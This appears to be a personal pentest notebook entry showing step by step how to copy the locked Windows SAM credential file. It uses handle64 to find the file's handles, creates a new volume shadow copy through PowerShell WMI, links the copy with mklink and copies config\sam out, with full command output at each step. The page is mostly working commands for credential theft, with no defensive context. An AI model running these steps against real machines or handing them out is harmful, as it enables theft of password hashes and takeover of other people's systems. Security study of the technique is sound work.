- List of interesting functions within Windows:
  - https://msdn.microsoft.com/en-us/library/windows/desktop/aa363858(v=vs.85).aspx
  - https://msdn.microsoft.com/en-us/library/windows/desktop/bb540534(v=vs.85).aspx

- Interesting handles in Windows for every functions:
  - https://msdn.microsoft.com/en-us/library/windows/desktop/ms724211(v=vs.85).aspx
  - https://msdn.microsoft.com/en-us/library/windows/desktop/bb540533(v=vs.85).aspx
  
- Identifying handles used by process:
<pre>
 C:\>handle64.exe "C:\Users\testmachine\Desktop\testssl.txt"

Nthandle v4.1 - Handle viewer
Copyright (C) 1997-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

WINWORD.EXE        pid: 436    type: File          2054: C:\Users\testmachine\Desktop\testssl.txt
</pre>

- Copying SAM files using handles:
  - Usually while copying the files out we get following error:
    <pre>
    C:\temp1>copy C:\Windows\System32\config\sam .
    The process cannot access the file because it is being used by another process.
        0 file(s) copied.
    </pre>
    
   - Identify handles for the SAM files
     <pre>
     C:\>handle64.exe C:\Windows\System32\config\sam

      Nthandle v4.1 - Handle viewer
      Copyright (C) 1997-2016 Mark Russinovich
      Sysinternals - www.sysinternals.com

      System             pid: 4      type: File           AA8: C:\Windows\System32\config\SAM.LOG2
      System             pid: 4      type: File           AF0: C:\Windows\System32\config\SAM.LOG1
      System             pid: 4      type: File           AF4: C:\Windows\System32\config\SAM
      </pre>     
   
   - Here, most of the handles are related to operating system. Hence, we try to close these handles we may end-up crashing the        operating system. So, lets try to read the SAM file from the snapshots. Following command will help us to list snapshots:
    <pre>
    C:\>vssadmin
    vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
    (C) Copyright 2001-2013 Microsoft Corp.

    ---- Commands Supported ----

    Delete Shadows        - Delete volume shadow copies
    List Providers        - List registered volume shadow copy providers
    List Shadows          - List existing volume shadow copies
    List ShadowStorage    - List volume shadow copy storage associations
    List Volumes          - List volumes eligible for shadow copies
    List Writers          - List subscribed volume shadow copy writers
    Resize ShadowStorage  - Resize a volume shadow copy storage association
    </pre>
    
    - List snapshots using:
    <pre>
    C:\>vssadmin list Shadows
    vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
    (C) Copyright 2001-2013 Microsoft Corp.

    Contents of shadow copy set ID: {ddabb2bb-9f3b-4c89-95a4-2f9d9606e600}
       Contained 1 shadow copies at creation time: 4/25/2017 3:30:37 PM
          Shadow Copy ID: {0727b789-e4a3-415d-8ffa-f9855ce414dd}
             Original Volume: (C:)\\?\Volume{def62bc0-7f76-4b55-938a-8fc96a242536}\
             Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
             Originating Machine: testmachine
             Service Machine: testmachine
             Provider: 'Microsoft Software Shadow Copy provider 1.0'
             Type: ClientAccessibleWriters
             Attributes: Persistent, Client-accessible, No auto release, Differential, Auto recovered

    Contents of shadow copy set ID: {70fba089-b7da-4547-b129-acad768545fb}
       Contained 1 shadow copies at creation time: 5/4/2017 4:24:20 PM
          Shadow Copy ID: {f254531c-dbb4-444a-bfbf-ec751c271838}
             Original Volume: (C:)\\?\Volume{def62bc0-7f76-4b55-938a-8fc96a242536}\
             Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3
             Originating Machine: testmachine
             Service Machine: testmachine
             Provider: 'Microsoft Software Shadow Copy provider 1.0'
             Type: ClientAccessibleWriters
             Attributes: Persistent, Client-accessible, No auto release, Differential, Auto recovered

    Contents of shadow copy set ID: {6e9f7009-b4bd-40f9-9111-c220120f3fd9}
       Contained 1 shadow copies at creation time: 5/14/2017 5:27:49 PM
          Shadow Copy ID: {f6d0279f-15e6-49db-83ea-73906d338ae7}
             Original Volume: (C:)\\?\Volume{def62bc0-7f76-4b55-938a-8fc96a242536}\
             Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4
             Originating Machine: testmachine
             Service Machine: testmachine
             Provider: 'Microsoft Software Shadow Copy provider 1.0'
             Type: ClientAccessibleWriters
             Attributes: Persistent, Client-accessible, No auto release, Differential, Auto recovered
       </pre>
           
    - The shadow copy files are old and hence we can't use it. So let's create a snapshot. However, on Windows 10 client version we can not create a snapshot. In server, vssadmin works differently.
    
    - Powershell script to create snapshot. Powershell to the rescue!! 
    <pre>
    C:\>powershell
    Windows PowerShell
    Copyright (C) 2016 Microsoft Corporation. All rights reserved.

    PS C:\> Get-WmiObject -list Win32_ShadowCopy


       NameSpace: ROOT\cimv2

    Name                                Methods              Properties
    ----                                -------              ----------
    Win32_ShadowCopy                    {Create, Revert}     {Caption, ClientAccessible, Count, Description...}
    </pre>
    
    - Create a new snapshot of C drive. This will return an object.
    <pre>
        PS C:\> (Get-WmiObject -list Win32_ShadowCopy).Create("C:\","ClientAccessible")


    __GENUS          : 2
    __CLASS          : __PARAMETERS
    __SUPERCLASS     :
    __DYNASTY        : __PARAMETERS
    __RELPATH        :
    __PROPERTY_COUNT : 2
    __DERIVATION     : {}
    __SERVER         :
    __NAMESPACE      :
    __PATH           :
    ReturnValue      : 0
    ShadowID         : {C6A8AFD3-433C-4773-8231-9EAAF39A052A}
    PSComputerName   :
    </pre>
    
    - Checking newly created snapshot:
    <pre>
    PS C:\> exit

    C:\>vssadmin list shadows
    vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
    (C) Copyright 2001-2013 Microsoft Corp.

    Contents of shadow copy set ID: {ddabb2bb-9f3b-4c89-95a4-2f9d9606e600}
       Contained 1 shadow copies at creation time: 4/25/2017 3:30:37 PM
          Shadow Copy ID: {0727b789-e4a3-415d-8ffa-f9855ce414dd}
             Original Volume: (C:)\\?\Volume{def62bc0-7f76-4b55-938a-8fc96a242536}\
             Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
             Originating Machine: testmachine
             Service Machine: testmachine
             Provider: 'Microsoft Software Shadow Copy provider 1.0'
             Type: ClientAccessibleWriters
             Attributes: Persistent, Client-accessible, No auto release, Differential, Auto recovered

    Contents of shadow copy set ID: {70fba089-b7da-4547-b129-acad768545fb}
       Contained 1 shadow copies at creation time: 5/4/2017 4:24:20 PM
          Shadow Copy ID: {f254531c-dbb4-444a-bfbf-ec751c271838}
             Original Volume: (C:)\\?\Volume{def62bc0-7f76-4b55-938a-8fc96a242536}\
             Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3
             Originating Machine: testmachine
             Service Machine: testmachine
             Provider: 'Microsoft Software Shadow Copy provider 1.0'
             Type: ClientAccessibleWriters
             Attributes: Persistent, Client-accessible, No auto release, Differential, Auto recovered

    Contents of shadow copy set ID: {6e9f7009-b4bd-40f9-9111-c220120f3fd9}
       Contained 1 shadow copies at creation time: 5/14/2017 5:27:49 PM
          Shadow Copy ID: {f6d0279f-15e6-49db-83ea-73906d338ae7}
             Original Volume: (C:)\\?\Volume{def62bc0-7f76-4b55-938a-8fc96a242536}\
             Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4
             Originating Machine: testmachine
             Service Machine: testmachine
             Provider: 'Microsoft Software Shadow Copy provider 1.0'
             Type: ClientAccessibleWriters
             Attributes: Persistent, Client-accessible, No auto release, Differential, Auto recovered

    Contents of shadow copy set ID: {39dddc22-0037-47c1-8f07-0f9f99c4393c}
       Contained 1 shadow copies at creation time: <B>5/15/2017 11:26:38 PM</B>
          Shadow Copy ID: {c6a8afd3-433c-4773-8231-9eaaf39a052a}
             Original Volume: (C:)\\?\Volume{def62bc0-7f76-4b55-938a-8fc96a242536}\
             Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5
             Originating Machine: testmachine
             Service Machine: testmachine
             Provider: 'Microsoft Software Shadow Copy provider 1.0'
             Type: ClientAccessible
             Attributes: Persistent, Client-accessible, No auto release, No writers, Differential
    </pre>
    
    - Reading files from the snapshot we will use mklink utility in cmd.
    <pre>
    C:\>mklink
    Creates a symbolic link.

    MKLINK [[/D] | [/H] | [/J]] Link Target

            /D      Creates a directory symbolic link.  Default is a file
                    symbolic link.
            /H      Creates a hard link instead of a symbolic link.
            /J      Creates a Directory Junction.
            Link    Specifies the new symbolic link name.
            Target  Specifies the path (relative or absolute) that the new link
                    refers to.

    C:\>mklink /d C:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\
    symbolic link created for C:\shadowcopy <<===>> \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\
    </pre>

    - copy the SAM files out:
    <pre>
      C:\>cd temp1

      C:\temp1>copy C:\shadowcopy\Windows\System32\config\sam .
        1 file(s) copied.
    </pre>
